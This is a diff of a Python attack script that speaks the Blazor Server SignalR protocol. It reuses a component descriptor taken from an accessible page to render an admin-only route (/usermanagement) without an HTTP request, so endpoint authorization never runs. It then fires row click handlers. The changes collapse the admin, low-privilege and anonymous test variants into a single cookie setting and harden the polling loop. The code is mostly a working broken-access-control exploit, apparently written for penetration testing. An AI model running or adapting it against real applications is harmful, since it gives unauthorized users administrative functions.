@@ -19,11 +19,11 @@ import json, re, time
 import requests, msgpack
 
 # ------------------------------- CONFIG --------------------------------
-BASE       = "https://target.example.com"
-PATH       = "/usermanagement"            # the blocked target route
-COOKIE     = "PASTE_SESSION_COOKIE_HERE"  # admin -- the one that already works
-LOW_COOKIE = "PASTE_LOW_PRIV_COOKIE_HERE"
-HARVEST    = "/"                          # a page the LOW account can load
+BASE    = "https://target.example.com"
+PATH    = "/usermanagement"        # route you want, reachable or not
+HARVEST = "/"                      # any page THIS cookie can load
+COOKIE  = "PASTE_COOKIE_HERE"      # the only knob. "" = anonymous.
+#                                    which account this belongs to IS the test.
 # ----------------------------------------------------------------------
 
 RS = b"\x1e"
@@ -177,6 +177,8 @@ class Circuit:
         self.rx = bytearray()       # survives across polls -- see iter_frames
         self.last_ping = time.time()
         self.handshook = False
+        self.poll_timeout = 100     # must exceed SignalR PollTimeout (~90s)
+        self.quiet = 0              # consecutive empty/timed-out polls
 
     # ---- transport ----
     def negotiate(self):
@@ -188,17 +190,42 @@ class Circuit:
         return j
 
     def send(self, data):
-        r = self.s.post(f"{self.base}/_blazor?id={self.token}", data=data,
-                        headers={"Content-Type": "application/octet-stream"})
+        try:
+            r = self.s.post(f"{self.base}/_blazor?id={self.token}", data=data,
+                            headers={"Content-Type": "application/octet-stream"},
+                            timeout=30)
+        except requests.exceptions.RequestException as e:
+            self.alive = False
+            raise RuntimeError(f"send failed: {e}") from None
         if r.status_code not in (200, 202):
+            self.alive = False
             raise RuntimeError(f"send {r.status_code}: {r.text[:200]}")
 
-    def poll(self, timeout=35):
-        r = self.s.get(f"{self.base}/_blazor?id={self.token}"
-                       f"&_={int(time.time() * 1000)}", timeout=timeout)
-        if r.status_code == 204:
+    def poll(self, timeout=None):
+        """An idle long poll is held open by the server for ~90s (SignalR's
+        PollTimeout) before returning empty. Our timeout must exceed that, and
+        a read timeout is normal quiet -- not an error."""
+        try:
+            r = self.s.get(f"{self.base}/_blazor?id={self.token}"
+                           f"&_={int(time.time() * 1000)}",
+                           timeout=timeout or self.poll_timeout)
+        except requests.exceptions.ReadTimeout:
+            self.quiet += 1
+            return b""
+        except requests.exceptions.RequestException as e:
+            print(f"[!] poll failed: {e}")
             self.alive = False
             return b""
+        if r.status_code == 204:
+            print("[x] server closed the connection (204)")
+            self.alive = False
+            return b""
+        if r.status_code != 200:
+            print(f"[!] poll HTTP {r.status_code}: {r.text[:200]}")
+            self.alive = False
+            return b""
+        if not r.content:
+            self.quiet += 1
         return r.content
 
     def handshake(self):
@@ -299,17 +326,34 @@ class Circuit:
         else:
             print(f"[s->c] {target} {str(args)[:120]}")
 
-    def pump(self, seconds=15):
+    def pump(self, seconds=30, quiet_limit=1):
+        """Poll until `seconds` elapses, or until the circuit goes quiet after
+        we have already seen at least one render batch."""
         end = time.time() + seconds
+        had = len(self.batches)
+        self.quiet = 0
         while self.alive and time.time() < end:
             if time.time() - self.last_ping > 12:
-                self.send(frame([6]))            # ping
+                try:
+                    self.send(frame([6]))        # ping
+                except RuntimeError as e:
+                    print(f"[!] {e}")
+                    break
                 self.last_ping = time.time()
+            t0 = time.time()
             raw = self.poll()
             if raw:
                 self.handle(raw)
+                self.quiet = 0
+            elif self.quiet >= quiet_limit and len(self.batches) > had:
+                break                            # rendered, then went quiet
+            elif time.time() - t0 < 1.0:
+                time.sleep(1.0)                  # never hot-loop a live target
         if self.rx:
             print(f"[i] {len(self.rx)} bytes buffered (partial frame pending)")
+        if len(self.batches) == had:
+            print("[i] no render batch arrived. Either StartCircuit was rejected,\n"
+                  "    the route rendered nothing, or interop is still blocking.")
 
 
 # ------------------------------- driver ---------------------------------
@@ -348,29 +392,15 @@ def run(cookie, label="run", harvest_path=None, target_uri=None,
 if __name__ == "__main__":
     TARGET = BASE.rstrip("/") + PATH
 
-    # -- 0. which pages can the low account harvest from?
-    # probe(LOW_COOKIE, ["/", "/dashboard", "/profile", "/home", PATH])
+    # 0. which pages does THIS cookie get descriptors from? pick one for HARVEST.
+    # probe(COOKIE, ["/", "/dashboard", "/profile", "/home", PATH])
 
-    # -- A. baseline: admin straight at the target (this already works)
-    # c = run(COOKIE, "A: admin baseline")
+    # 1. borrow a descriptor from HARVEST, point the circuit at PATH.
+    #    PATH is never requested over HTTP, so endpoint auth never runs.
+    c = run(COOKIE, "borrowed descriptor", harvest_path=HARVEST, target_uri=TARGET)
 
-    # -- B. low-priv, borrowed descriptor, circuit pointed at the blocked route.
-    #       No HTTP request is ever made for PATH.
-    c = run(LOW_COOKIE, "B: low-priv / borrowed descriptor",
-            harvest_path=HARVEST, target_uri=TARGET)
-
-    # -- C. same, but arrive by in-circuit routing instead of the start uri
-    # c = run(LOW_COOKIE, "C: low-priv / in-circuit nav",
-    #         harvest_path=HARVEST, navigate_to=TARGET)
-
-    # -- D. admin's descriptor replayed into a low-priv circuit
-    #       (tests whether descriptors are bound to identity)
-    # _, admin_marks, _ = harvest(BASE, COOKIE, PATH)
-    # c = run(LOW_COOKIE, "D: admin descriptor / low-priv session",
-    #         target_uri=TARGET, marks=admin_marks)
-
-    # -- E. no cookie at all. Does the circuit require auth for anything?
-    # c = run("", "E: anonymous", harvest_path="/", target_uri=TARGET)
+    # 2. or arrive by in-circuit routing instead (different server code path)
+    # c = run(COOKIE, "in-circuit nav", harvest_path=HARVEST, navigate_to=TARGET)
 
     # once a batch shows the table, fire row handlers:
     #   c.dispatch_event(47)                               # click
